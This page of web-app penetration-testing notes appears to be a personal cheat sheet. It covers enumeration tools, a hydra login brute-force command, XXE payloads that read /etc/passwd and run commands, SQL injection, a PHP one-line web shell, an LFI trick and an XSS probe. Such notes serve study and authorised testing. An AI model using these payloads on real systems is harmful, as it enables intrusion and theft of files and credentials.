---
layout: page
title: Web App
permalink: /web/
---

# Index

* [Enumeration](#enumeration)
* [Authentication](#authentication)
* [Session Management](#session-management)
* [XML External Entity](#xml-external-entity)
* [SQL Injection](#sql-injection)
* [PHP Injection](#php-injection)
* [Cross Site Scripting](#cross-site-scripting)
* [Deserialization](#deserialization)
* [Other Tools](#other-tools)
* [Methodology](#methodology)

## Enumeration

Enumerating a web application is best performed manually with automated augmentations.

### Spidering

`burpsuite`

### Directory Brute Forcing

`dirbuster`

### Web Server Scanning

`nikto`

### Scraping 

`cewl`

---

## Authentication

### Brute Forcing Online

`hydra`

For example attacking a web login form

`hydra 192.168.1.69 http-form-post "form_login.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -o hydra-http-post-attack.txt`


---

## Session Management

---

## XML External Entity

Local file inclusion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

Remote code exectuion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
Above is just proof of concept, other functions exist.

---

## SQL Injection

Suppose a SQL query like below, where parameters are received from user input

```SQL
SELECT id FROM users WHERE username='$username' AND password='$password';
```

If we managed to input data like below we could return unintended data.

```SQL
SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'
```

We can also save a request in burp and feed it into `sqlmap` or fuzz with `sqlmap` directly.
```
sqlmap
```

---

## PHP Injection

If we can inject the below string anywhere interpreted as php we get RCE.

`<?php system($_GET['cmd']); ?>`

If there is LFI the below might work

`site.php?lfi_path=php://input%00`

Other things to try https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

---

## Cross Site Scripting

Wherever user input is reflect in the site test for XSS with:

``` Javascript
    <script>alert('x')</script>
```

---

## Deserialization

---

## Other Tools

* FoxyProxy - simple proxy switcher for firefox
* w3af - Web Application Scanner
* wikto/Nikto - Web server scanner
* Firebug/Chrome Dev tools - Inspecting client side
* Hydra - Password brute forcing
* wpscan - Scan wordpress
* droopscan - scan Drupal & Silverstripe CMS

### Unix Commands

* wget - easily download files
* curl - can make post requests too
* ncat - tcp/ip swiss army knife
* socat - two way netcat
* stunnel - ssl tunnel

---

## Methodology

See:
* The Web Application Hacker's Handbook - Chapter 21
* https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/
